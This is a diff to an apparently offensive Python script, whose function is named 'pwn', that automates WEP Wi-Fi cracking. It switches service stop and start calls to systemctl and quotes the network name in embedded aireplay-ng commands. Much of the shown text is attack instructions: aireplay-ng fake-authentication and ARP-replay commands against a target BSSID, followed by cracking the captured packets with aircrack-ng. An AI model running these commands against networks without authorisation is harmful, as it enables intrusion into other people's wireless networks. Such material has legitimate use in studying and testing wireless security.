@@ -34,9 +34,9 @@ def pwn(interface, network):
 	print "[+] Shutting down services"
 
 	# BEGIN CHANGE ME
-	os.system("/etc/init.d/wpa_supplicant stop")
-	os.system("/etc/init.d/dhcpcd stop")
-	os.system("/etc/init.d/avahi-daemon stop")
+	os.system("systemctl stop wpa_supplicant@wlan0.service")
+	os.system("systemctl stop dhcpcd.service")
+	os.system("systemctl stop avahi-daemon.service")
 	# END CHANGE ME
 
 	print "[+] Acquiring MAC address:",
@@ -63,9 +63,9 @@ def pwn(interface, network):
 	
 	instructions = """
 == Get Deauthetication Packets (Fake Authentication) ==
-aireplay-ng -1 0 -e NAME -a BSSID -h MAC INTERFACE
+aireplay-ng -1 0 -e 'NAME' -a BSSID -h MAC INTERFACE
 OR
-aireplay-ng -1 6000 -o 1 -q 10 -e NAME -a BSSID -h MAC INTERFACE
+aireplay-ng -1 6000 -o 1 -q 10 -e 'NAME' -a BSSID -h MAC INTERFACE
 
 == Request ARP Packets ==
 aireplay-ng -3 -b BSSID -h MAC INTERFACE
@@ -107,9 +107,9 @@ aircrack-ng -z -b BSSID output*.cap
 
 	print "[+] Starting stopped services"
 	# BEGIN CHANGE ME
-	os.system("/etc/init.d/wpa_supplicant start")
-	os.system("/etc/init.d/dhcpcd start")
-	os.system("/etc/init.d/avahi-daemon start")
+	os.system("systemctl start wpa_supplicant@wlan0.service")
+	os.system("systemctl start dhcpcd.service")
+	os.system("systemctl start avahi-daemon.service")
 	# END CHANGE ME
 
 def get_name(cell):
